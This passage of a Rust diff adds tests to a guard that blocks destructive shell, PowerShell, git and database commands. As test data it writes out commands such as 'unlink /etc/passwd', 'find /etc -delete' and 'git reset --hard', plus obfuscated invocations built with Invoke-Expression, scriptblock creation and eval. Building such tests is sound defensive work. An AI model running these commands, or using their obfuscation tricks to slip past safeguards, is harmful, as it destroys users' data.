+                        "inert {pack_id} executable text must remain allowed for {command:?}; index={}: {:?}",
+                        index.is_some(),
+                        result.pattern_info,
+                    );
+                }
+            }
+        }
+
+        let enabled_packs = std::collections::HashSet::from(["database.postgresql".to_string()]);
+        let ordered_packs = crate::packs::REGISTRY.expand_enabled_ordered(&enabled_packs);
+        let enabled_keywords = crate::packs::REGISTRY.collect_enabled_keywords(&enabled_packs);
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+        for index in [None, keyword_index.as_ref()] {
+            for command in [
+                "psql -f dangerous.sql",
+                "& psql -f dangerous.sql",
+                "$EXE='psql'; & $EXE -f dangerous.sql",
+                "$EXE=\"psql\"; & $EXE -f dangerous.sql",
+                "$env:EXE='psql'; & $env:EXE -f dangerous.sql",
+                "$env:EXE=\"psql\"; & $env:EXE -f dangerous.sql",
+                "$EXE='psql'; $env:EXE='cat'; & $EXE -f dangerous.sql",
+                "$EXE='cat'; $env:EXE='psql'; & $env:EXE -f dangerous.sql",
+                "$EXE='psql'; & $env:EXE -f dangerous.sql",
+                "$EXE='psql'; $EXE=$env:DB_CLIENT; & $EXE -f dangerous.sql",
+            ] {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    enabled_keywords.as_slice(),
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    Some(temp.path()),
+                    None,
+                    ShellDialect::PowerShell,
+                );
+                assert!(
+                    result.is_denied(),
+                    "PowerShell database executable alias must retain its file flow for {command:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info,
+                );
+            }
+            for command in [
+                "$EXE='psql'; Write-Output $EXE",
+                "$EXE=\"psql\"; Write-Output $EXE",
+                "$env:EXE='psql'; Write-Output $env:EXE",
+                "$env:EXE=\"psql\"; Write-Output $env:EXE",
+                "$EXE='psql'; $env:EXE='cat'; & $env:EXE -f dangerous.sql",
+                "$EXE='cat'; $env:EXE='psql'; & $EXE -f dangerous.sql",
+                "& psql -X -c 'SELECT 1'",
+            ] {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    enabled_keywords.as_slice(),
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    Some(temp.path()),
+                    None,
+                    ShellDialect::PowerShell,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "inert PowerShell database alias output must remain allowed for {command:?}; index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info,
+                );
+            }
         }
     }
 
@@ -10020,6 +17297,32 @@ mod tests {
     }
 
     #[test]
+    fn database_argument_substitutions_use_shell_ast_ranges() {
+        let comment_owned_paren = "psql app -c \"$(printf DROP # )\nprintf ' TABLE users;')\"";
+        let result = evaluate_with_pack_ids(comment_owned_paren, &["database.postgresql"]);
+        assert!(
+            result.is_denied(),
+            "a comment-owned closing parenthesis must not truncate a code-bearing substitution: {result:?}"
+        );
+        assert_eq!(
+            result
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some(INDIRECT_INPUT_RULE)
+        );
+
+        assert!(
+            evaluate_with_pack_ids(
+                "psql app -c \"$(printf 'SELECT 1;')\"",
+                &["database.postgresql"],
+            )
+            .is_allowed(),
+            "a bounded literal producer should remain statically reconstructable"
+        );
+    }
+
+    #[test]
     fn redirected_repl_files_are_bounded_and_evaluated() {
         assert_eq!(
             parse_redirect_path(r#""C:\Temp\danger.redis""#),
@@ -10539,6 +17842,7 @@ mod tests {
             &allowlists,
         );
         assert!(result.is_allowed());
+        assert!(result.quick_rejected);
 
         // Even with more keywords
         let result = evaluate_command(
@@ -10549,6 +17853,19 @@ mod tests {
             &allowlists,
         );
         assert!(result.is_allowed());
+        assert!(result.quick_rejected);
+
+        // A clean allow reached after relevant-keyword evaluation is not a
+        // quick reject merely because it has no pattern match.
+        let result = evaluate_command(
+            "rm ./scratch-file.txt",
+            &config,
+            &["git", "rm"],
+            &compiled,
+            &allowlists,
+        );
+        assert!(result.is_allowed());
+        assert!(!result.quick_rejected);
     }
 
     // =========================================================================
@@ -10557,7 +17874,11 @@ mod tests {
 
     #[test]
     fn heredoc_scan_runs_before_keyword_quick_reject() {
-        let config = default_config();
+        let mut config = default_config();
+        // This test asserts the high-fidelity match source. Keep extraction
+        // scheduler stalls from intentionally selecting the bounded legacy
+        // fallback during the highly parallel library suite.
+        config.heredoc.timeout_ms = Some(5_000);
         let compiled = default_compiled_overrides();
         let allowlists = default_allowlists();
 
@@ -10691,7 +18012,11 @@ mod tests {
 
     #[test]
     fn heredoc_commands_are_evaluated_and_block_when_severity_blocks_by_default() {
-        let config = default_config();
+        let mut config = default_config();
+        // The denial fallback is also safe, but this test specifically proves
+        // AST attribution and therefore needs a semantic-test extraction
+        // budget rather than the production 50 ms scheduler budget.
+        config.heredoc.timeout_ms = Some(5_000);
         let compiled = default_compiled_overrides();
         let allowlists = default_allowlists();
 
@@ -10716,7 +18041,10 @@ mod tests {
 
     #[test]
     fn heredoc_commands_with_non_blocking_matches_are_allowed() {
-        let config = default_config();
+        let mut config = default_config();
+        // Prove the warn-only semantic result independently of parallel test
+        // contention around the production 50 ms extraction budget.
+        config.heredoc.timeout_ms = Some(5_000);
         let compiled = default_compiled_overrides();
         let allowlists = default_allowlists();
 
@@ -10745,6 +18073,9 @@ mod tests {
     #[test]
     fn heredoc_language_filter_can_skip_unwanted_languages() {
         let mut config = default_config();
+        // Language-filter semantics are the assertion under test; a scheduler
+        // timeout would instead produce an indeterminate decision.
+        config.heredoc.timeout_ms = Some(5_000);
         config.heredoc.languages = Some(vec!["python".to_string()]);
         let compiled = default_compiled_overrides();
         let allowlists = default_allowlists();
@@ -10758,7 +18089,10 @@ mod tests {
 
     #[test]
     fn heredoc_allowlist_can_override_ast_denial() {
-        let config = default_config();
+        let mut config = default_config();
+        // Preserve deterministic AST rule metadata under parallel test load;
+        // an extraction timeout cannot exercise the rule-specific allowlist.
+        config.heredoc.timeout_ms = Some(5_000);
         let compiled = default_compiled_overrides();
         let allowlists =
             project_allowlists_for_rule("heredoc.javascript:fs_rmsync.catastrophic", "local dev");
@@ -10788,6 +18122,9 @@ mod tests {
     #[test]
     fn heredoc_content_allowlist_project_scope_skips_ast_scan() {
         let mut config = default_config();
+        // The allowlist contract needs a deterministic semantic budget under
+        // the highly parallel full-library test run.
+        config.heredoc.timeout_ms = Some(5_000);
         let cwd = std::env::current_dir().expect("current_dir must be available");
         let cwd_str = cwd.to_string_lossy().into_owned();
 
@@ -11662,10 +18999,23 @@ mod tests {
             let cmd = format!("cat > f.py <<PY\nprint(\"{} build\")\nPY", rmrf());
             assert!(!blocked(&cmd), "cat data sink must not block: {cmd:?}");
         }
+
+        #[test]
+        fn visible_function_or_alias_cannot_spoof_a_data_sink() {
+            for cmd in [
+                "cat() { bash -s; }\ncat <<'EOF'\nrm -r ./tree\nEOF",
+                "alias cat='bash -s'\ncat <<'EOF'\nrm -r ./tree\nEOF",
+            ] {
+                assert!(
+                    blocked(cmd),
+                    "a same-script override can execute the nominal data sink's stdin: {cmd:?}"
+                );
+            }
+        }
     }
 
     // =========================================================================
-    // Deadline / Fail-Open Tests (git_safety_guard-99e.14)
+    // Deadline / Indeterminate Tests (git_safety_guard-99e.14, dcg#213)
     // =========================================================================
 
     mod deadline_tests {
@@ -11677,9 +19027,9 @@ mod tests {
             crate::config::Config::default().heredoc_settings()
         }
 
-        /// When deadline is already exceeded (zero duration), evaluation should fail-open immediately.
+        /// An already-expired deadline must never be interpreted as an allow.
         #[test]
-        fn exceeded_deadline_fails_open() {
+        fn exceeded_deadline_is_indeterminate() {
             let compiled_overrides = default_compiled_overrides();
             let allowlists = default_allowlists();
             let heredoc_settings = test_heredoc_settings();
@@ -11702,10 +19052,9 @@ mod tests {
                 Some(&deadline),
             );
 
-            // Should allow due to budget exhaustion, not deny
             assert!(
-                result.is_allowed(),
-                "Zero-duration deadline should fail open and allow command"
+                result.is_indeterminate(),
+                "Zero-duration deadline must not silently allow a command"
             );
             assert!(
                 result.skipped_due_to_budget,
@@ -11815,17 +19164,32 @@ mod tests {
             );
         }
 
-        /// Test the `allowed_due_to_budget()` result structure.
+        /// Test the `indeterminate_due_to_budget()` result structure.
         #[test]
-        fn allowed_due_to_budget_structure() {
-            let result = EvaluationResult::allowed_due_to_budget();
+        fn indeterminate_due_to_budget_structure() {
+            let result = EvaluationResult::indeterminate_due_to_budget();
 
-            assert!(result.is_allowed());
+            assert!(!result.is_allowed());
             assert!(!result.is_denied());
+            assert!(result.is_indeterminate());
             assert!(result.skipped_due_to_budget);
             assert!(result.pattern_info.is_none());
             assert!(result.allowlist_override.is_none());
             assert!(result.effective_mode.is_none());
+        }
+
+        #[test]
+        fn nested_budget_exhaustion_is_never_treated_as_allow() {
+            let result = EvaluationResult::indeterminate_due_to_budget();
+            assert!(nested_evaluation_incomplete(&result));
+
+            // Defend the propagation boundary even if a future producer sets
+            // the legacy budget flag before converting the public decision.
+            let mut flagged_allow = EvaluationResult::allowed();
+            flagged_allow.skipped_due_to_budget = true;
+            assert!(nested_evaluation_incomplete(&flagged_allow));
+
+            assert!(!nested_evaluation_incomplete(&EvaluationResult::allowed()));
         }
 
         /// Safe pattern matching must respect deadline — a burst of backtracking
@@ -11864,7 +19228,6 @@ mod tests {
                 keyword_matcher: None,
                 safe_regex_set: None,
                 safe_regex_set_is_complete: false,
-                default_effects: crate::packs::DEFAULT_PACK_EFFECTS,
             };
 
             // Craft adversarial input: keyword match + repetitive whitespace tokens
@@ -11907,7 +19270,7 @@ mod tests {
                 Some(&deadline),
             );
 
-            assert!(result.is_allowed());
+            assert!(result.is_indeterminate());
             assert!(result.skipped_due_to_budget);
         }
 
@@ -12024,15 +19387,15 @@ mod tests {
     }
 
     #[test]
-    fn medium_severity_git_patterns_are_evaluated() {
-        // Test git branch -D and stash drop (both Medium severity)
+    fn branch_delete_high_and_stash_drop_medium_are_evaluated() {
+        // Branch deletion is High/default-deny; stash drop remains Medium.
         let config = default_config();
         let compiled = config.overrides.compile();
         let allowlists = default_allowlists();
 
-        // git branch -D is Medium severity
+        // Every branch deletion form is High severity after #209.
         let branch_result = evaluate_command(
-            "git branch -D feature-branch",
+            "git branch -d feature-branch",
             &config,
             &["git"],
             &compiled,
@@ -12040,14 +19403,25 @@ mod tests {
         );
         assert!(
             branch_result.is_denied(),
-            "git branch -D should be evaluated"
+            "git branch -d should be evaluated"
         );
         let branch_info = branch_result.pattern_info.as_ref().unwrap();
-        assert_eq!(branch_info.severity, Some(crate::packs::Severity::Medium));
+        assert_eq!(branch_info.severity, Some(crate::packs::Severity::High));
         assert_eq!(
             branch_info.pattern_name.as_deref(),
             Some("branch-force-delete")
         );
+
+        for command in [
+            "git branch --show-current && ls -d",
+            "git branch --show-current; printf '%s' --delete",
+            "git branch --show-current || echo --force",
+        ] {
+            assert!(
+                evaluate_command(command, &config, &["git"], &compiled, &allowlists,).is_allowed(),
+                "later-command option-like data must not be attributed to git branch: {command}"
+            );
+        }
 
         // git stash drop is Medium severity
         let stash_result = evaluate_command(
@@ -12064,6 +19438,2443 @@ mod tests {
         let stash_info = stash_result.pattern_info.as_ref().unwrap();
         assert_eq!(stash_info.severity, Some(crate::packs::Severity::Medium));
         assert_eq!(stash_info.pattern_name.as_deref(), Some("stash-drop"));
+    }
+
+    #[test]
+    fn branch_semantics_match_indexed_and_unindexed_evaluator_paths() {
+        let enabled_keywords = ["git"];
+        let ordered_packs = ["core.git".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let config = default_config();
+        let heredoc_settings = config.heredoc_settings();
+
+        let destructive = [
+            "git branch -d feature",
+            "git branch --del feature",
+            "git branch -M old existing",
+            "git branch --no-format -d feature",
+            "git branch --set-upstream -d feature",
+            "git branch --merged HEAD -d feature",
+            "FOO=bar git branch --del feature",
+            "gIt.ExE branch -d feature",
+            r"& 'C:\Program Files\Git\cmd\git.exe' branch --delete feature",
+            r#"git branch --del "$(printf feature)""#,
+        ];
+        let safe = [
+            "git branch --format -d",
+            "git branch --form -d",
+            "git branch --merged -d feature",
+            "git branch --without --delete feature",
+            "git branch -d --no-delete feature",
+            "git branch --force --no-force feature",
+            "git branch --end-of-options -d",
+            "git branch --delete=feature",
+            "git branch -dh feature",
+            "git --exec-path branch -d feature",
+            "FOO=bar git branch --format -d",
+            r#"git branch --format -d "$(printf feature)""#,
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for command in destructive.iter().copied() {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} with index={}",
+                    index.is_some()
+                );
+                let info = result.pattern_info.expect("denial must have metadata");
+                assert_eq!(info.pack_id.as_deref(), Some("core.git"));
+                assert_eq!(info.pattern_name.as_deref(), Some("branch-force-delete"));
+                assert_eq!(info.severity, Some(crate::packs::Severity::High));
+            }
+            for command in safe.iter().copied() {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow {command:?} with index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn filesystem_rm_semantics_are_segment_local_in_both_evaluator_paths() {
+        let enabled_keywords = ["rm", "find", "unlink", "sudo"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        let destructive = [
+            (
+                "rm -r /tmp/cache; /bin/rm -r ./tree",
+                "rm-recursive-general",
+            ),
+            ("echo ready && sudo rm -r ./tree", "rm-recursive-general"),
+            ("rm -ri ./tree; unlink /etc/passwd", "unlink-root-home"),
+            (
+                "rm -r /tmp/cache; find /etc -delete",
+                "find-delete-root-home",
+            ),
+            (
+                "rm -r /tmp/cache > /etc/dcg-audit-target",
+                "redirect-truncate-root-home",
+            ),
+            ("echo $(rm -r ./tree)", "rm-recursive-general"),
+            ("rm -ri ./tree > /etc/passwd", "redirect-truncate-root-home"),
+            (
+                "rm -ri ./tree 'literal > /etc/passwd",
+                "redirect-truncate-root-home",
+            ),
+            ("rm -ri ./tree $(unlink /etc/passwd)", "unlink-root-home"),
+        ];
+        let safe = [
+            "rm -r /tmp/cache; /bin/rm -r /var/tmp/build",
+            "rm -ri ./tree; find /tmp/dcg-audit -delete",
+            r#"rm -r "/tmp/unlink /etc/passwd""#,
+            r#"rm -r "/tmp/find /etc -delete x""#,
+            r#"rm -ri ./tree "/tmp/note > /etc/passwd""#,
+            "rm -ri ./tree <> /etc/passwd",
+            "rm -ri ./tree 0<> /etc/passwd",
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (command, expected_rule) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_denied(),
+                    "must deny {command:?} with index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+                assert_eq!(
+                    result
+                        .pattern_info
+                        .as_ref()
+                        .and_then(|info| info.pattern_name.as_deref()),
+                    Some(expected_rule),
+                    "wrong rule for {command:?} with index={}",
+                    index.is_some()
+                );
+            }
+
+            for command in safe {
+                let result = evaluate_command_with_pack_order_deadline_at_path(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "must allow {command:?} with index={}: {:?}",
+                    index.is_some(),
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn inline_shells_preserve_automated_stdin_provenance() {
+        let enabled_keywords = ["rm"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let mut config = default_config();
+        // The test asserts nested-shell stdin provenance, not the production
+        // extraction scheduler. Give semantic analysis a deterministic budget
+        // when the full library suite runs under heavy parallel load.
+        config.heredoc.timeout_ms = Some(5_000);
+        let heredoc_settings = config.heredoc_settings();
+
+        for index in [None, keyword_index.as_ref()] {
+            for command in [
+                "yes | sh -c 'rm -ri ./tree'",
+                "yes | bash -c 'if true; then rm -ri ./tree; fi'",
+                "yes | sh -c 'bash -c \"rm -ri ./tree\"'",
+                "yes | echo \"$(rm -ri ./tree)\"",
+                "yes | b'a'sh -c 'rm -ri ./tree'",
+            ] {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    crate::normalize::ShellDialect::Posix,
+                );
+                assert!(
+                    result.is_denied(),
+                    "piped answers inherited by an inline shell must make recursive interactive rm destructive: {command}: {:?}",
+                    result.pattern_info
+                );
+            }
+
+            let manual = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                "sh -c 'rm -ri ./tree'",
+                &enabled_keywords,
+                &ordered_packs,
+                index,
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                crate::normalize::ShellDialect::Posix,
+            );
+            assert!(
+                manual.is_allowed(),
+                "without automated stdin, interactive recursive rm retains its confirmation barrier: {:?}",
+                manual.pattern_info
+            );
+            let manual_substitution = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                "echo \"$(rm -ri ./tree)\"",
+                &enabled_keywords,
+                &ordered_packs,
+                index,
+                &compiled,
+                &allowlists,
+                &heredoc_settings,
+                None,
+                None,
+                None,
+                crate::normalize::ShellDialect::Posix,
+            );
+            assert!(
+                manual_substitution.is_allowed(),
+                "an unpiped substitution retains terminal-driven interactive confirmation: {:?}",
+                manual_substitution.pattern_info
+            );
+        }
+    }
+
+    #[test]
+    fn executable_text_sinks_recurse_or_fail_closed_without_treating_construction_as_execution() {
+        use crate::normalize::ShellDialect;
+
+        let enabled_keywords = ["rm"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let allowlists = default_allowlists();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        let destructive = [
+            (ShellDialect::Posix, "eval 'rm -r ./tree'"),
+            (ShellDialect::Posix, "X=m; eval \"r${X} -r ./tree\""),
+            (ShellDialect::Posix, "echo 'rm -r ./tree' | sh"),
+            (
+                ShellDialect::Posix,
+                "printf '%s\\n' 'rm -r ./tree' | cat | bash -s worker",
+            ),
+            (ShellDialect::Posix, "cat payload.sh | dash"),
+            (ShellDialect::Posix, "echo \"$DCG_SOURCE\" | sh"),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Expression ('r'+'m -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Microsoft.PowerShell.Utility\\Invoke-Expression ('r'+'m -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "if ($true) { Invoke-Expression ('r'+'m -r ./tree') }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "try { iex ('r'+'m -r ./tree') } finally { Write-Output done }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "'r'+'m -r ./tree' | Invoke-Expression",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "'r'+'m -r ./tree' | Microsoft.PowerShell.Utility\\Invoke-Expression",
+            ),
+            (ShellDialect::PowerShell, "$dynamicSource | iex"),
+            (ShellDialect::PowerShell, "Get-Content payload.ps1 | iex"),
+            (ShellDialect::PowerShell, "iex $dynamicSource"),
+            (
+                ShellDialect::PowerShell,
+                "& ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ([scriptblock]:: Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ([ scriptblock ]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "& ([System.Management.Automation.ScriptBlock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "(&([scriptblock]::Create('r'+'m -r ./tree')))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "if ($true) { & ([scriptblock]::Create('r'+'m -r ./tree')) }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "try { . ([scriptblock]::Create('r'+'m -r ./tree')) } finally { Write-Output done }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "([scriptblock]::Create('r'+'m -r ./tree')).Invoke()",
+            ),
+            (
+                ShellDialect::PowerShell,
+                ". ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                ". [scriptblock]::Create('r'+'m -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Command -ScriptBlock ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Command ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Microsoft.PowerShell.Core\\Invoke-Command ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "1 | ForEach-Object ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Microsoft.PowerShell.Core\\ForEach-Object -InputObject 1 -Process ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Set-Alias run Invoke-Expression; run ('r'+'m -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); & $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); $x.Invoke()",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); . $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); Invoke-Command $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]:: Create('r'+'m -r ./tree'); if ($true) { & $x }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[System.Management.Automation.ScriptBlock]::Create('r'+'m -r ./tree'); try { . $x } finally { Write-Output done }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); if ($true) { Invoke-Command $x }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "if ($true) { $x=[scriptblock]::Create('r'+'m -r ./tree'); & $x }",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "[scriptblock]$x=[scriptblock]::Create('r'+'m -r ./tree'); & $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "${x-y}=[scriptblock]::Create('r'+'m -r ./tree'); & ${x-y}",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); $x.InvokeWithContext(@{}, [System.Collections.Generic.List[System.Management.Automation.PSVariable]]::new())",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); ${x}?.Invoke()",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); 1 | ForEach-Object -Begin $x -Process {}",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); 1 | ForEach-Object -Process {} -End $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); 1 | ForEach-Object -Parallel $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); 1 | ForEach-Object -Begin {} -Process {} -RemainingScripts $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create($env:DCG_SOURCE); & $x",
+            ),
+        ];
+        let safe = [
+            (ShellDialect::Posix, "eval 'printf ok'"),
+            (ShellDialect::Posix, "echo 'printf ok' | sh"),
+            (ShellDialect::Posix, "echo 'rm -r ./tree' | cat"),
+            (ShellDialect::Posix, "echo 'rm -r ./tree' | sh -c 'cat'"),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Expression ('Write'+'-Output ok')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "'Write'+'-Output ok' | Invoke-Expression",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "[scriptblock]::Create('rm -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x = [scriptblock]::Create('rm -r ./tree')",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Write-Output ([scriptblock]::Create('rm -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "function Show-Block { param([scriptblock]$ScriptBlock); Write-Output safe }; Show-Block -ScriptBlock ([scriptblock]::Create('rm -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "1 | Microsoft.PowerShell.Core\\Where-Object -Property Length ([scriptblock]::Create('rm -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Set-Alias out Write-Output; out 'rm -r ./tree'",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('Write-Output ok'); & $x",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$x=[scriptblock]::Create('r'+'m -r ./tree'); $x.Invoke",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "([scriptblock]::Create('r'+'m -r ./tree')).Invoke",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "Invoke-Command -ScriptBlock { param($x) Write-Output $x } -ArgumentList ([scriptblock]::Create('r'+'m -r ./tree'))",
+            ),
+            (
+                ShellDialect::PowerShell,
+                "$handler = { if ($true) { $x=[scriptblock]::Create('r'+'m -r ./tree'); & $x } }",
+            ),
+        ];
+
+        for index in [None, keyword_index.as_ref()] {
+            for (dialect, command) in destructive {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_denied(),
+                    "executable source must be inspected or rejected for {dialect:?}: {command}: {:?}",
+                    result.pattern_info
+                );
+            }
+
+            for (dialect, command) in safe {
+                let result = evaluate_command_with_pack_order_deadline_at_path_in_dialect(
+                    command,
+                    &enabled_keywords,
+                    &ordered_packs,
+                    index,
+                    &compiled,
+                    &allowlists,
+                    &heredoc_settings,
+                    None,
+                    None,
+                    None,
+                    dialect,
+                );
+                assert!(
+                    result.is_allowed(),
+                    "inert or harmless source must remain allowed for {dialect:?}: {command}: {:?}",
+                    result.pattern_info
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn posix_pipeline_shell_source_is_checked_across_protected_packs() {
+        let destructive = evaluate_with_pack_ids("echo 'git reset --hard' | sh", &["core.git"]);
+        assert!(
+            destructive.is_denied(),
+            "shell pipeline source must reach the Git pack: {:?}",
+            destructive.pattern_info
+        );
+    }
+
+    #[test]
+    fn filesystem_rule_allowlists_do_not_hide_other_segment_destruction() {
+        let enabled_keywords = ["rm", "unlink"];
+        let ordered_packs = ["core.filesystem".to_string()];
+        let keyword_index = crate::packs::REGISTRY.build_enabled_keyword_index(&ordered_packs);
+        let compiled = default_compiled_overrides();
+        let heredoc_settings = default_config().heredoc_settings();
+
+        let allowlists = project_allowlists_for_rule(
+            "core.filesystem:rm-recursive-general",
+            "segment-local rm allowlist test",
+        );
+        let result = evaluate_command_with_pack_order_deadline_at_path(
+            "rm -r ./tree; unlink /etc/passwd",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+        );
+        assert!(result.is_denied());
+        assert_eq!(
+            result
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
+            Some("unlink-root-home")
+        );
+
+        let allowlists = project_allowlists_for_rule(
+            "core.filesystem:redirect-truncate-root-home",
+            "redirect-only allowlist test",
+        );
+        let result = evaluate_command_with_pack_order_deadline_at_path(
+            "rm -r ./tree > /etc/dcg-audit-target",
+            &enabled_keywords,
+            &ordered_packs,
+            keyword_index.as_ref(),
+            &compiled,
+            &allowlists,
+            &heredoc_settings,
+            None,
+            None,
+            None,
+        );
+        assert!(result.is_denied());
+        assert_eq!(
+            result
+                .pattern_info
+                .as_ref()
+                .and_then(|info| info.pattern_name.as_deref()),
